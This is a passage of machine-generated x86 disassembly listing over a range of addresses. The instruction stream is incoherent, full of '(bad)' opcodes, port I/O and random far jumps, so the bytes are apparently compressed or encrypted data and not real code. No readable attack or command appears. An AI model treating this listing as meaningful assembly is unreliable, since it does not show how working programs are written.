  4281f4:	mov    ah,0xc7
  4281f6:	xor    ebx,DWORD PTR ds:0x28798b9e
  4281fc:	sar    BYTE PTR [edi-0x5b6f5f2b],cl
  428202:	or     eax,esi
  428204:	popa   
  428205:	push   edx
  428206:	jl     0x4281ef
  428208:	and    eax,0x962827ad
  42820d:	inc    eax
  42820e:	jle    0x4281eb
  428210:	jl     0x42823b
  428212:	jno    0x42823d
  428214:	xchg   DWORD PTR [ecx+0x3d],eax
  428217:	push   esi
  428218:	repnz inc esp
  42821a:	sahf   
  42821b:	sub    cl,bh
  42821d:	in     eax,dx
  42821e:	xor    edx,DWORD PTR [esi+0x6e]
  428221:	push   esi
  428222:	outs   dx,DWORD PTR ds:[esi]
  428223:	push   eax
  428224:	fcmovnbe st,st(2)
  428226:	rcl    esp,1
  428228:	xchg   ecx,eax
  428229:	adc    DWORD PTR [edi],esi
  42822b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42822c:	dec    eax
  42822d:	fwait
  42822e:	imul   esp,DWORD PTR [edx],0xffffff83
  428231:	and    ch,BYTE PTR [edx]
  428233:	inc    eax
  428234:	jne    0x4281b8
  428236:	mov    eax,0x9bbf5932
  42823b:	xchg   esi,eax
  42823c:	push   cs
  42823d:	mov    eax,ds:0x26a6fbe6
  428242:	add    al,0x58
  428244:	jle    0x428266
  428246:	sbb    al,0xf3
  428248:	(bad)  
  428249:	xchg   edx,eax
  42824a:	cmp    BYTE PTR [ebp+0x1],bl
  42824d:	shr    ah,cl
  42824f:	and    eax,DWORD PTR [edi+0x3c]
  428252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428253:	dec    ebx
  428254:	inc    esp
  428255:	jle    0x4282c7
  428257:	call   0x238fe558
  42825c:	or     al,al
  42825e:	or     DWORD PTR [eax+eax*4+0x2b],0xffffffca
  428263:	(bad)  
  428264:	sahf   
  428265:	push   ss
  428266:	pop    ds
  428267:	stos   BYTE PTR es:[edi],al
  428268:	xabort 0xc3
  42826b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42826c:	jne    0x42824f
  42826e:	jae    0x4282a9
  428270:	popf   
  428271:	(bad)  
  428272:	addr16 ret 
  428274:	ins    DWORD PTR es:[edi],dx
  428275:	jmp    0xca26ab6e
  42827a:	mov    ebp,DWORD PTR [edx+edx*4]
  42827d:	std    
  42827e:	inc    eax
  42827f:	mov    edi,0x22cd48ab
  428284:	shr    BYTE PTR [eax+esi*2],0x1
  428288:	dec    ebp
  428289:	cwde   
  42828a:	std    
  42828b:	js     0x42820f
  42828d:	cmp    eax,DWORD PTR [edi-0x3a]
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	scas   eax,DWORD PTR es:[edi]
  428301:	icebp  
  428302:	push   ebp
  428303:	sar    BYTE PTR [ebp*4+0x1040001],0x0
  42830b:	add    dl,ah
  42830d:	call   0x732b2dcb
  428312:	xor    BYTE PTR [edi+0x4d],cl
  428315:	out    0xd7,eax
  428317:	jne    0x42838d
  428319:	retf   0x6dbc
  42831c:	in     al,0x86
  42831e:	leave  
  42831f:	data16 stos BYTE PTR es:[edi],al
  428321:	dec    edx
  428322:	icebp  
  428323:	nop
  428324:	enter  0xb999,0xfc
  428328:	mov    gs,WORD PTR [esi]
  42832a:	mov    eax,DWORD PTR [ecx-0x2fd9cb11]
  428330:	push   ss
  428331:	mov    ecx,0x51529676
  428336:	mov    BYTE PTR [esi+0x6e24cd28],cl
  42833c:	xchg   ebp,eax
  42833d:	fisttp DWORD PTR [edi+0x7a]
  428340:	xor    DWORD PTR [edi+0x40a2a185],eax
  428346:	adc    BYTE PTR [ebx],al
  428348:	cmp    al,0xe7
  42834a:	xchg   esi,eax
  42834b:	jne    0x42830a
  42834d:	mov    ebx,0xddc59940
  428352:	bound  edi,QWORD PTR [ebx+0x6ea8d9e2]
  428358:	gs push edi
  42835a:	popa   
  42835b:	cmp    edi,ebx
  42835d:	add    eax,0xeaf26412
  428362:	ins    DWORD PTR es:[edi],dx
  428363:	(bad)  
  428364:	fucomp st(7)
  428366:	aaa    
  428367:	clc    
  428368:	xor    BYTE PTR [ecx+0x41539c],ah
  42836e:	fs dec ebp
  428370:	push   esp
  428371:	out    0x7,al
  428373:	rcr    DWORD PTR [eax+0x6b22870c],1
  428379:	jle    0x4283da
  42837b:	ror    DWORD PTR [eax+ecx*8+0x75],1
  42837f:	adc    DWORD PTR ds:0x9e768b15,esi
  428385:	mov    eax,ebp
  428387:	add    BYTE PTR [edx+0x10],bh
  42838a:	repnz and al,BYTE PTR [esp+edi*4+0x53e07181]
  428392:	stc    
  428393:	xchg   ebx,eax
  428394:	dec    edx
  428395:	pop    es
  428396:	cmp    edi,DWORD PTR [edx-0x68f928a4]
  42839c:	ss and eax,0x39ae28db
  4283a2:	in     eax,dx
  4283a3:	outs   dx,DWORD PTR ds:[esi]
  4283a4:	cmp    ebp,edi
  4283a6:	lods   eax,DWORD PTR ds:[esi]
  4283a7:	adc    eax,0x81845c78
  4283ac:	(bad)  
  4283ad:	pop    edx
  4283ae:	push   esp
  4283af:	stc    
  4283b0:	and    BYTE PTR [eax],ch
  4283b2:	and    eax,0xc00b28cb
  4283b7:	xchg   edi,eax
  4283b8:	fld    st(6)
  4283ba:	jb     0x42840e
  4283bc:	lock xor al,0xf1
  4283bf:	adc    dh,BYTE PTR [ecx+edx*2+0x3f77f68b]
  4283c6:	inc    esi
  4283c7:	pop    edx
  4283c8:	or     BYTE PTR [ebp+edi*2+0x47800c00],0x7c
  4283d0:	sar    DWORD PTR [esi+ecx*8-0x17e43881],0x2b
  4283d8:	sbb    esi,DWORD PTR [esi+0x4b0ebf77]
  4283de:	dec    ecx
  4283df:	pop    es
  4283e0:	test   eax,0xdc62d739
  4283e5:	cmp    ebp,DWORD PTR [ecx-0x74ea5eec]
  4283eb:	rcl    edi,0x9b
  4283ee:	cmp    BYTE PTR [ebx+eiz*8-0xcb08b0b],al
  4283f5:	cld    
  4283f6:	sbb    eax,0xac418358
  4283fb:	pop    ebp
  4283fc:	das    
  4283fd:	loopne 0x428435
  4283ff:	and    al,0x8d
  428401:	xchg   ecx,eax
  428402:	aaa    
  428403:	sub    eax,0x6b382994
  428408:	add    DWORD PTR [edi-0x1a],ebx
  42840b:	sti    
  42840c:	ins    BYTE PTR es:[edi],dx
  42840d:	xchg   BYTE PTR [esi],dl
  42840f:	mov    esp,0x0
	...
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x94abfb32
  428481:	call   0xae836463
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	fwait
  42848d:	cmp    dh,BYTE PTR [eax-0x6aa0c8bd]
  428493:	test   ah,al
  428495:	mov    ch,0x50
  428497:	fadd   st(7),st
  428499:	rcr    al,cl
  42849b:	and    DWORD PTR [edi-0x6a],edx
  42849e:	mov    fs,WORD PTR [edi-0x46ecbddd]
  4284a4:	call   0x968e:0xdb86c4c
  4284ab:	jo     0x4284b2
  4284ad:	fwait
  4284ae:	(bad)  
  4284af:	iret   
  4284b0:	je     0x428454
  4284b2:	test   al,0x33
  4284b4:	mov    ecx,DWORD PTR [eax]
  4284b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284b7:	cwde   
  4284b8:	int    0x4f
  4284ba:	pop    eax
  4284bb:	fiadd  WORD PTR [eax-0x706d56c2]
  4284c1:	sub    al,0xad
  4284c3:	dec    eax
  4284c4:	mov    dl,0x88
  4284c6:	add    eax,0xc9d60807
  4284cb:	retf   0x7f3
  4284ce:	adc    bh,BYTE PTR [esi+0x62197c57]
  4284d4:	fucom  st(3)
  4284d6:	jnp    0x4284b3
  4284d8:	sbb    al,0xb3
  4284da:	jmp    0xaf0cd09f
  4284df:	jg     0x428547
  4284e1:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4284e3:	or     dh,al
  4284e5:	mov    edx,0xd6b03b57
  4284ea:	adc    ah,0xea
  4284ed:	adc    esi,DWORD PTR [eax]
  4284ef:	add    eax,0xeef155b3
  4284f4:	adc    al,0x73
  4284f6:	les    ebp,FWORD PTR [ecx-0x6]
  4284f9:	mov    cl,0x4b
  4284fb:	inc    esp
  4284fc:	push   esp
  4284fd:	lea    esi,[edx-0x37]
  428500:	push   ecx
  428501:	and    edi,DWORD PTR [ecx-0x7de1500]
  428507:	and    esi,edi
  428509:	cmp    al,0x2b
  42850b:	les    esi,FWORD PTR [eax+0x75]
  42850e:	rcl    BYTE PTR [eax+0xa91f2d4],0xcd
  428515:	or     eax,0x8e6146c9
  42851a:	rol    DWORD PTR [ecx-0x4f96b485],0x55
  428521:	enter  0x6e9b,0x48
  428525:	int3   
  428526:	adc    ah,BYTE PTR [ebx]
  428528:	and    ebp,esi
  42852a:	out    0xcb,al
  42852c:	mov    ds:0x5463d85a,eax
  428531:	(bad)  
  428532:	dec    ebp
  428533:	adc    esi,edx
  428535:	ret    0xd2db
  428538:	push   eax
  428539:	lds    ebp,FWORD PTR [ebx+0x7f]
  42853c:	inc    esp
  42853d:	retf   
  42853e:	dec    edx
  42853f:	into   
  428540:	mov    bl,0xd9
  428542:	cmc    
  428543:	cmp    BYTE PTR [edi],ch
  428545:	or     al,0xfb
  428547:	(bad)  
  428549:	sub    al,0x8b
  42854b:	cld    
  42854c:	cmp    al,bh
  42854e:	push   0x1dad353f
  428553:	in     al,dx
  428554:	lahf   
  428555:	retf   
  428556:	in     al,dx
  428557:	push   cs
  428558:	sub    BYTE PTR [ecx+0xc5af581],bh
  42855e:	xor    bh,bl
  428560:	mov    BYTE PTR [edx+0x6c],bh
  428563:	pop    edx
  428564:	ja     0x4285c9
  428566:	and    esp,esi
  428568:	inc    eax
  428569:	popf   
  42856a:	cmp    BYTE PTR [esi],bl
  42856c:	sub    BYTE PTR [edx],cl
  42856e:	and    ecx,DWORD PTR [esi]
  428570:	and    ebp,DWORD PTR cs:[edx-0x12feda30]
  428577:	or     edi,ebp
  428579:	out    0xc4,eax
  42857b:	xchg   edi,eax
  42857c:	mov    ah,bl
  42857e:	mov    ds,WORD PTR [edx]
  428580:	xor    al,BYTE PTR [eax]
  428582:	sti    
  428583:	add    BYTE PTR [ecx-0x22c90a30],bh
  428589:	jns    0x428532
  42858b:	out    0x5,eax
  42858d:	out    0x80,al
  42858f:	lahf   
	...
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x6011a3f6
  428602:	dec    edx
  428603:	scas   al,BYTE PTR es:[edi]
  428604:	inc    esp
  428605:	scas   eax,DWORD PTR es:[edi]
  428606:	add    DWORD PTR [eax],eax
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	pop    edi
  42860d:	cmp    esp,0x2e
  428610:	jmp    0x42861b
  428612:	mov    gs,WORD PTR ds:0xa00dfdc5
  428618:	(bad)  
  428619:	jecxz  0x428649
  42861b:	ins    BYTE PTR es:[edi],dx
  42861c:	in     eax,dx
  42861d:	xor    eax,0x3e9757c6
  428622:	xchg   DWORD PTR [ebp+edi*2+0x5f215667],edi
  428629:	sar    DWORD PTR [ebx-0x27bc5d0d],0x8e
  428630:	push   ecx
  428631:	xor    edx,DWORD PTR [ecx]
  428633:	test   DWORD PTR [ecx],ebp
  428635:	mov    ecx,0x881ea447
  42863a:	mov    esi,0xfdcf976
  42863f:	mov    al,ds:0x2aa6ce3e
  428644:	hlt    
  428645:	sub    al,0xd3
  428647:	mov    ds:0x17246032,eax
  42864c:	mov    edx,0x812d7a98
  428651:	rol    DWORD PTR [ebx],cl
  428653:	mov    dh,0x4c
  428655:	les    ebx,FWORD PTR [esi+ebx*2]
  428658:	aas    
  428659:	xor    ah,al
  42865b:	(bad)  
  42865c:	test   eax,0x467d7a0
  428661:	and    ecx,DWORD PTR [ebp+0x39ab9030]
  428667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428668:	cmp    DWORD PTR [esi-0x21fc34f0],edx
  42866e:	(bad)  [eax-0x27]
  428671:	fcmovnbe st,st(1)
  428673:	xchg   esi,eax
  428674:	push   edx
  428675:	ja     0x428687
  428677:	ficomp WORD PTR [ebx]
  428679:	out    dx,al
  42867a:	inc    eax
  42867b:	cmp    eax,0xd53d90d
  428680:	imul   ebp,DWORD PTR [ecx+0x79a1387b],0xffffffff
  428687:	sar    DWORD PTR ds:0xe915a737,1
  42868d:	push   edx
  42868e:	mov    al,0x77
  428690:	pop    edi
  428691:	add    eax,0xa11e9ae3
  428696:	(bad)  [ebx+0x1fd8d910]
  42869c:	sahf   
  42869d:	stc    
  42869e:	shl    BYTE PTR [ebx+edi*4+0x6],cl
  4286a2:	mov    ds:0x568e8106,eax
  4286a7:	sub    ebp,DWORD PTR ds:0xf83af02c
  4286ad:	in     al,dx
  4286ae:	pop    edi
  4286af:	push   edi
  4286b0:	pop    edi
  4286b1:	bound  ecx,QWORD PTR [eax-0xf]
  4286b4:	jmp    0xdd31:0x27962a85
  4286bb:	inc    edi
  4286bc:	mov    ebx,0x47610299
  4286c1:	sti    
  4286c2:	dec    ebp
  4286c3:	fucomp st(7)
  4286c5:	loopne 0x4286d2
  4286c7:	rcl    bl,0x25
  4286ca:	add    BYTE PTR [eax],dl
  4286cc:	mov    ebx,0x9dc868e8
  4286d1:	ins    DWORD PTR es:[edi],dx
  4286d2:	fisub  WORD PTR [edi]
  4286d4:	mov    esi,ecx
  4286d6:	cmp    DWORD PTR [edx+0x65fb7d15],eax
  4286dc:	inc    edi
  4286dd:	cdq    
  4286de:	stos   DWORD PTR es:[edi],eax
  4286df:	adc    bh,ch
  4286e1:	arpl   WORD PTR [ebp+0x628bac48],dx
  4286e7:	es scas eax,DWORD PTR es:[edi]
  4286e9:	cmp    BYTE PTR [esi+0x7b],0xe9
  4286ed:	mov    edx,0x2c4452c2
  4286f2:	(bad)  
  4286f3:	jmp    0x4286b7
  4286f5:	ret    0x1902
  4286f8:	call   0xa6dc:0x26a04676
  4286ff:	cli    
  428700:	jp     0x428734
  428702:	sbb    DWORD PTR [esi-0x7d],edi
  428705:	frstor [esi+0x6c]
  428708:	xor    al,0x35
  42870a:	or     esp,esi
  42870c:	in     al,0x6
  42870e:	cmp    al,0x86
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x3c033596
  428783:	ret    0xb048
  428786:	add    DWORD PTR [eax],eax
  428788:	add    al,0x1
  42878a:	add    BYTE PTR [eax],al
  42878c:	out    dx,al
  42878d:	cwde   
  42878e:	rcl    ebx,0x90
  428791:	add    eax,ecx
  428793:	inc    ebx
  428794:	aam    0x7c
  428796:	arpl   WORD PTR [edi-0xb037fce],sp
  42879c:	test   eax,0x857ba55f
  4287a1:	xor    DWORD PTR [ecx],edx
  4287a3:	jmp    0x3b6b:0xba400870
  4287aa:	mov    ?,WORD PTR [edx-0x59c7b72f]
  4287b0:	int    0xbd
  4287b2:	cmp    eax,0xa4388a45
  4287b7:	cmp    ah,al
  4287b9:	or     eax,0x1883c8b0
  4287be:	sub    eax,0x9da2630e
  4287c3:	xchg   edx,eax
  4287c4:	rol    DWORD PTR [ecx+0x29aaffe3],0xaa
  4287cb:	mov    esi,ebp
  4287cd:	mov    bh,BYTE PTR [edi-0x49]
  4287d0:	stc    
  4287d1:	int3   
  4287d2:	pushf  
  4287d3:	(bad)  
  4287d5:	js     0x42877d
  4287d7:	test   eax,0x16f26418
  4287dc:	add    edx,0xb
  4287df:	imul   esp,esp,0x1cc5d843
  4287e5:	(bad)  
  4287e6:	mov    cl,0xb4
  4287e8:	repnz pop esp
  4287ea:	outs   dx,BYTE PTR ss:[esi]
  4287ec:	cld    
  4287ed:	jg     0x428865
  4287ef:	jmp    0x96ef:0xafb7475e
  4287f6:	xor    bl,BYTE PTR [eax+0x4d]
  4287f9:	inc    edx
  4287fa:	pushf  
  4287fb:	add    DWORD PTR [edx-0x75884474],edi
  428801:	test   DWORD PTR [edi-0x2b],0x7880227a
  428808:	mov    esi,0x3d50fc32
  42880d:	out    0x53,eax
  42880f:	push   esp
  428810:	push   0xffffffb5
  428812:	jo     0x4287e3
  428814:	mov    cl,ch
  428816:	mov    eax,ds:0xee6014f2
  42881b:	jno    0x4287e4
  42881d:	int3   
  42881e:	mov    esp,DWORD PTR [ebx]
  428820:	(bad)  
  428821:	out    dx,al
  428822:	add    BYTE PTR [ebx],ch
  428824:	push   esp
  428825:	mov    eax,DWORD PTR [edi+ebp*1+0x7f]
  428829:	std    
  42882a:	cli    
  42882b:	hlt    
  42882c:	push   esi
  42882d:	es cmp eax,0x765f2c8d
  428833:	test   eax,0xa905bc53
  428838:	xchg   dl,cl
  42883a:	outs   dx,BYTE PTR ds:[esi]
  42883b:	mov    al,ds:0x18d992d0
  428840:	inc    ebx
  428841:	aas    
  428842:	or     al,dh
  428844:	test   dh,dh
  428846:	mov    ch,BYTE PTR [ecx-0x42ba15f6]
  42884c:	push   ecx
  42884d:	out    0xba,ax
  428850:	mov    edx,0x1dac5636
  428855:	pop    ds
  428856:	mov    edx,0x9eab1aea
  42885b:	gs pop ds
  42885d:	xor    DWORD PTR [ecx],0xffffffe4
  428860:	jbe    0x4288ac
  428862:	jmp    0xd6aa769a
  428867:	mov    eax,ds:0x9998ef1f
  42886c:	cmp    bl,BYTE PTR [ebx-0x4926f243]
  428872:	pop    edx
  428873:	or     eax,0x3e98aa64
  428878:	push   edx
  428879:	push   es
  42887a:	out    0xa3,al
  42887c:	call   0x4007:0xeda655ae
  428883:	push   esp
  428884:	dec    eax
  428885:	jle    0x428890
  428887:	sub    ecx,DWORD PTR [eax]
  428889:	in     al,0xe9
  42888b:	and    eax,0xf67e4211
	...
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0xe289d0f],bx
  428902:	aad    0x68
  428904:	dec    esp
  428905:	mov    cl,0x1
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	mov    al,ds:0x44345d98
  428911:	add    esi,eax
  428913:	push   0x48
  428915:	inc    ebp
  428916:	cmp    al,0x16
  428918:	imul   edi,DWORD PTR [ebx-0x70],0x1cfa0afa
  42891f:	sbb    cl,BYTE PTR [esi-0x24]
  428922:	ret    0xeb4
  428925:	or     bl,BYTE PTR [edx-0x502c8cfc]
  42892b:	xchg   esi,eax
  42892c:	jg     0x42897f
  42892e:	mov    al,0x97
  428930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428931:	into   
  428932:	mov    ch,0x97
  428934:	aas    
  428935:	xchg   ah,al
  428937:	int    0x85
  428939:	leave  
  42893a:	cdq    
  42893b:	mov    dh,0xca
  42893d:	pop    ebx
  42893e:	cmp    DWORD PTR gs:[edi+0x3],edx
  428942:	shl    BYTE PTR [edi+0x13],1
  428945:	mov    dh,0x7c
  428947:	jae    0x4289ba
  428949:	mov    eax,ds:0x7a06cb1c
  42894e:	loopne 0x4289a6
  428950:	xlat   BYTE PTR ds:[ebx]
  428951:	sbb    DWORD PTR [esi],edi
  428953:	jnp    0x428903
  428955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428956:	jns    0x4289b4
  428958:	cmp    bl,BYTE PTR [esi-0x6411b4c8]
  42895e:	xchg   esp,eax
  42895f:	or     al,0x23
  428961:	adc    BYTE PTR [eax+ebx*2+0x52],ah
  428965:	push   eax
  428966:	dec    esp
  428967:	jbe    0x4289a5
  428969:	aas    
  42896a:	(bad)
  42896d:	mov    BYTE PTR [eax+eax*4],al
  428970:	mov    ah,0x56
  428972:	xchg   ecx,eax
  428973:	xchg   esp,eax
  428974:	retf   
  428975:	adc    DWORD PTR [eax+ecx*1+0x3bb0f627],ebp
  42897c:	sub    DWORD PTR [eax],ebp
  42897e:	ja     0x4289f6
  428980:	jp     0x42894d
  428982:	jmp    DWORD PTR [esi+0x77]
  428985:	stc    
  428986:	leave  
  428987:	mov    esi,0xff831fcd
  42898c:	mov    esi,0xd3f670f1
  428991:	push   ebp
  428992:	sub    BYTE PTR [esi+0x7d],ch
  428995:	popa   
  428996:	(bad)  
  428997:	adc    BYTE PTR ds:0x69a5f1d3,dl
  42899d:	aad    0x88
  42899f:	(bad)  
  4289a0:	jmp    0x7c84:0x3f77b0d7
  4289a7:	sbb    esp,ebp
  4289a9:	jns    0x428966
  4289ab:	das    
  4289ac:	int3   
  4289ad:	test   DWORD PTR [eax+0x5f],esi
  4289b0:	xor    BYTE PTR [edi],0xf3
  4289b3:	mov    ecx,0xdd8c11a0
  4289b8:	(bad)  
  4289b9:	mov    ecx,0x8503f97e
  4289be:	sbb    DWORD PTR [edi-0xd],0xf4f0bb90
  4289c5:	xor    esp,edi
  4289c7:	fcmovne st,st(6)
  4289c9:	int    0xb7
  4289cb:	mov    eax,ds:0x1d9e0ac8
  4289d0:	pop    ebp
  4289d1:	out    0x10,al
  4289d3:	int3   
  4289d4:	repnz pusha 
  4289d6:	inc    ebp
  4289d7:	add    DWORD PTR [edi],edi
  4289d9:	in     eax,0xd3
  4289db:	mov    WORD PTR [edx+0x6],cs
  4289de:	ds mov cl,0xa5
  4289e1:	cmp    cl,BYTE PTR [edx-0x23]
  4289e4:	aas    
  4289e5:	pop    es
  4289e6:	cli    
  4289e7:	popa   
  4289e8:	add    DWORD PTR [edi-0x6b67bb70],esi
  4289ee:	mov    dl,0x98
  4289f0:	stos   DWORD PTR es:[edi],eax
  4289f1:	dec    ebp
  4289f2:	push   esi
  4289f3:	(bad)  
  4289f4:	fld    TBYTE PTR [ecx+ebx*4-0x466e5e23]
  4289fb:	test   eax,0x5b12dfa0
  428a00:	pop    ecx
  428a01:	or     al,bl
  428a03:	iret   
  428a04:	in     eax,0x65
  428a06:	shl    DWORD PTR [edx],1
  428a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a09:	sbb    al,0x3b
  428a0b:	clc    
  428a0c:	mov    ah,0x86
  428a0e:	mov    ds:0xa,al
	...
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x67745013]
  428a83:	call   0x443cd8
  428a88:	add    al,0x1
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	mov    bh,0xa
  428a8e:	or     ah,BYTE PTR [esp+ebp*4+0x5c]
  428a92:	(bad)  
  428a94:	push   ds
  428a95:	and    DWORD PTR es:[ecx-0x4b3d0e6b],0xffffffd1
  428a9d:	loop   0x428a75
  428a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428aa0:	push   ebp
  428aa1:	inc    esi
  428aa2:	jg     0x428aa2
  428aa4:	push   cs
  428aa5:	retf   
  428aa6:	stos   BYTE PTR es:[edi],al
  428aa7:	push   ecx
  428aa8:	ins    DWORD PTR es:[edi],dx
  428aa9:	pushf  
  428aaa:	xchg   ecx,eax
  428aab:	jae    0x428ada
  428aad:	aaa    
  428aae:	pop    esi
  428aaf:	popa   
  428ab0:	cmc    
  428ab1:	cmp    al,0x7b
  428ab3:	js     0x428b01
  428ab5:	nop
  428ab6:	xchg   esi,eax
  428ab7:	mov    al,ds:0x71042e1b
  428abc:	push   ds
  428abd:	jge    0x428b37
  428abf:	push   cs
  428ac0:	dec    edx
  428ac1:	je     0x428b27
  428ac3:	jb     0x428afe
  428ac5:	loop   0x428a95
  428ac7:	test   BYTE PTR [esp+ecx*8],al
  428aca:	cmp    BYTE PTR [ecx],0x3e
  428acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ace:	add    eax,0xcfa4f31
  428ad3:	lods   eax,DWORD PTR ds:[esi]
  428ad4:	rol    BYTE PTR [edx-0x2f],0x36
  428ad8:	inc    ebp
  428ad9:	push   esp
  428ada:	inc    esp
  428adb:	inc    ecx
  428adc:	inc    esp
  428add:	sbb    eax,0x189d6db6
  428ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ae3:	mov    edx,0xbee7cfec
  428ae9:	adc    dl,BYTE PTR [ecx]
  428aeb:	push   ss
  428aec:	cdq    
  428aed:	(bad)  
  428aee:	fisubr WORD PTR [esi-0x5a]
  428af1:	in     eax,0x87
  428af3:	add    edi,DWORD PTR [edx+0x21754aaa]
  428af9:	imul   ecx,DWORD PTR [edx+0x50064d5e],0x525464ca
  428b03:	cdq    
  428b04:	pop    edi
  428b05:	mov    dl,0x54
  428b07:	retf   0xe0c
  428b0a:	call   0x2cb9:0xcaabe8ff
  428b11:	hlt    
  428b12:	mov    BYTE PTR [ebx],bh
  428b14:	ins    BYTE PTR es:[edi],dx
  428b15:	xor    BYTE PTR [eax-0x32d87389],dh
  428b1b:	jmp    0xdac8392e
  428b20:	jmp    0x27c:0xde468903
  428b27:	repz std 
  428b29:	xchg   ecx,eax
  428b2a:	inc    edi
  428b2b:	stos   BYTE PTR es:[edi],al
  428b2c:	lods   eax,DWORD PTR ds:[esi]
  428b2d:	retf   0x21db
  428b30:	sub    eax,0x4d763393
  428b35:	es or  eax,0x37d639a9
  428b3b:	push   ebx
  428b3c:	xchg   ebx,eax
  428b3d:	sub    ecx,edx
  428b3f:	xor    ebx,edi
  428b41:	jno    0x428b58
  428b43:	pop    ds
  428b44:	int    0x17
  428b46:	xor    al,0x96
  428b48:	cdq    
  428b49:	cwde   
  428b4a:	ja     0x428b37
  428b4c:	(bad)  
  428b4d:	cmc    
  428b4e:	and    eax,0xb50c1151
  428b53:	or     eax,0xd4e77dd2
  428b58:	retf   0x9761
  428b5b:	inc    ebx
  428b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b5d:	and    DWORD PTR [esi+0x54baaa3c],ebx
  428b63:	cmp    DWORD PTR [edx],edi
  428b65:	jmp    0x428b53
  428b67:	xchg   esp,eax
  428b68:	imul   ebp,esp,0xffffffc7
  428b6b:	shl    bl,1
  428b6d:	mov    cl,0xb3
  428b6f:	repz jmp 0xf4b4:0x767936a4
  428b77:	fstp   st(7)
  428b79:	jae    0x428b24
  428b7b:	mov    fs,WORD PTR [ebp+0x68]
  428b7e:	mov    ?,WORD PTR [ecx+0x48]
  428b81:	int3   
  428b82:	ret    0x3336
  428b85:	in     al,0xfc
  428b87:	push   0x316e639f
  428b8c:	adc    eax,0x82c305
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x217d7e8
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	xchg   edi,eax
  428c0d:	xor    DWORD PTR [eax+0x2],0xda5853a9
  428c14:	les    ecx,FWORD PTR [esi-0x7e]
  428c17:	imul   eax,DWORD PTR [edx-0x5b],0xbced3feb
  428c1e:	adc    eax,0xeb27c740
  428c23:	mov    edi,0x6221d04f
  428c28:	and    BYTE PTR [ebx-0x4e],ch
  428c2b:	shl    BYTE PTR [eax+0x39649113],1
  428c31:	iret   
  428c32:	shl    DWORD PTR [esi-0x15],1
  428c35:	pop    ecx
  428c36:	leave  
  428c37:	add    edx,esi
  428c39:	mov    ebx,0x330d82af
  428c3e:	or     al,BYTE PTR [ebp-0x6da70c4]
  428c44:	clc    
  428c45:	mov    BYTE PTR ds:0x4adc0381,bl
  428c4b:	bound  eax,QWORD PTR [ebp+0x739fcaaa]
  428c51:	dec    esi
  428c52:	out    0x12,al
  428c54:	int3   
  428c55:	adc    dh,BYTE PTR ds:0x81be28f7
  428c5b:	jmp    0x428c63
  428c5d:	test   bh,ah
  428c5f:	mov    ebp,0x81e1a0a8
  428c64:	gs fwait
  428c66:	ss in  eax,dx
  428c68:	pop    edi
  428c69:	push   ebp
  428c6a:	ins    BYTE PTR es:[edi],dx
  428c6b:	test   DWORD PTR [edi*8+0xbdc0ba],ebp
  428c72:	pop    ss
  428c73:	popa   
  428c74:	loop   0x428c9a
  428c76:	test   BYTE PTR [edx-0x62],bl
  428c79:	mov    cl,0x52
  428c7b:	ja     0x428ce2
  428c7d:	sub    eax,DWORD PTR [eax]
  428c7f:	outs   dx,DWORD PTR ds:[esi]
  428c80:	jp     0x428c69
  428c82:	cs inc ebx
  428c84:	or     al,0x6d
  428c86:	loop   0x428cbf
  428c88:	or     cl,cl
  428c8a:	xchg   DWORD PTR [edx-0x3f],edx
  428c8d:	rcl    esi,1
  428c8f:	cwde   
  428c90:	push   ds
  428c91:	out    0xdf,al
  428c93:	ror    dl,1
  428c95:	adc    bh,BYTE PTR [eax]
  428c97:	shr    BYTE PTR [esi+0x69],0xfd
  428c9b:	jbe    0x428c2a
  428c9d:	std    
  428c9e:	xor    BYTE PTR [edi-0x58],al
  428ca1:	cld    
  428ca2:	imul   esp,ecx,0x55
  428ca5:	lahf   
  428ca6:	mov    cl,ah
  428ca8:	push   esp
  428ca9:	xor    eax,0xe2ebd633
  428cae:	and    edx,edx
  428cb0:	add    BYTE PTR [ebp+edi*1+0x4761c6e9],dh
  428cb7:	retf   0x8e48
  428cba:	xlat   BYTE PTR ds:[ebx]
  428cbb:	lock cld 
